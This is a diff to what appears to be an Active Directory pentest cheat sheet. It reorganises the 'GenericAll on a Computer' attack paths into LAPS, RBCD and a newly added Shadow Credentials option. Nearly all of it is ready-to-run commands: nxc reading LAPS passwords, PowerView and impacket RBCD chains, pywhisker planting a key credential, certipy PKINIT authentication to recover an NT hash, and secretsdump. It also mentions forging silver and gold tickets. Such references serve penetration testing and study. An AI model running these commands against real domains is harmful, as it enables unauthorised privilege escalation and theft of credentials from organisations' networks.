@@ -133,9 +133,15 @@ nxc ldap DC_IP -u user -p pass -M groupmembership -o GROUP='Domain Admins'
 
 ### GenericAll on a Computer
 
-Two paths: **LAPS** (if deployed) or **RBCD**. Always check LAPS first — it's one command vs. four steps.
+Three paths, in order of preference — try the next one only if the previous is blocked:
 
-**Fast path — LAPS (see the full LAPS section below):**
+| Option | What's Needed | When to Use |
+|---|---|---|
+| **1. LAPS read** | LAPS deployed on target | Always try first — 1 LDAP query → local admin |
+| **2. RBCD** | `MachineAccountQuota > 0` OR an existing computer account you control | Default fallback |
+| **3. Shadow Credentials** | ADCS deployed in the forest | Use when MAQ=0 blocks RBCD |
+
+**Option 1 — LAPS (fast path, see the full LAPS section below):**
 
 ```bash
 # If LAPS is deployed, GenericAll → read LAPS → local admin
@@ -144,7 +150,7 @@ nxc ldap DC_IP -u user -p pass --laps
 nxc smb TARGET_IP -u Administrator -p 'LAPS_PASSWORD' --local-auth
 ```
 
-**Fallback — RBCD from Windows (PowerView):**
+**Option 2 — RBCD from Windows (PowerView):**
 
 ```powershell
 # Configure RBCD to yourself (you need a computer account too)
@@ -155,7 +161,7 @@ $sd.GetBinaryForm($bytes, 0)
 Set-DomainObject -Identity TARGETPC -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}
 ```
 
-**Fallback — Full RBCD chain from Linux:**
+**Option 2 — Full RBCD chain from Linux:**
 
 ```bash
 # Step 1: Create a fake computer account (default quota: 10 per user)
@@ -179,6 +185,33 @@ impacket-psexec -k -no-pass domain.local/administrator@target.domain.local
 impacket-rbcd domain.local/user:pass \
   -delegate-to 'TARGET$' -delegate-from 'FAKEPC$' -action remove -dc-ip DC_IP
 ```
+
+**Option 3 — Shadow Credentials (when MAQ=0 blocks RBCD):**
+
+If `ms-DS-MachineAccountQuota` is `0` and you don't already control a computer account, RBCD is dead on arrival. **Shadow Credentials** abuses the same GenericAll/GenericWrite right by writing a key credential to `msDS-KeyCredentialLink` on the target — then authenticating as the target computer via PKINIT to recover its TGT / NT hash.
+
+**Requirements:** ADCS must be deployed in the forest (Shadow Credentials relies on PKINIT, which needs a CA-issued KDC cert on the DC — standard ADCS deployments satisfy this).
+
+```bash
+# Step 1: Add a key credential on TARGET$ — outputs TARGET.pfx + password
+pywhisker -d domain.local -u user -p pass \
+  --target 'TARGET$' --action add -dc-ip DC_IP
+
+# Step 2: Authenticate as TARGET$ with the cert → get NT hash
+certipy auth -pfx TARGET.pfx -dc-ip DC_IP
+
+# Step 3: Use the hash (TARGET$ is local SYSTEM on its own machine)
+impacket-secretsdump -hashes :NTHASH domain.local/'TARGET$'@TARGET_IP
+
+# Or request a silver/gold ticket from the hash, or pivot via S4U from a
+# computer account context — any "I control TARGET$" follow-up works.
+
+# Cleanup — remove the key credential so the account reverts to clean state
+pywhisker -d domain.local -u user -p pass \
+  --target 'TARGET$' --action remove -dc-ip DC_IP
+```
+
+> 💡 **Why this works:** `msDS-KeyCredentialLink` is how Windows Hello for Business binds a public key to an account. GenericAll/GenericWrite lets you plant your own key there — and once you own the private key, PKINIT gives you a TGT for that account with no password at all.
 
 ---
 
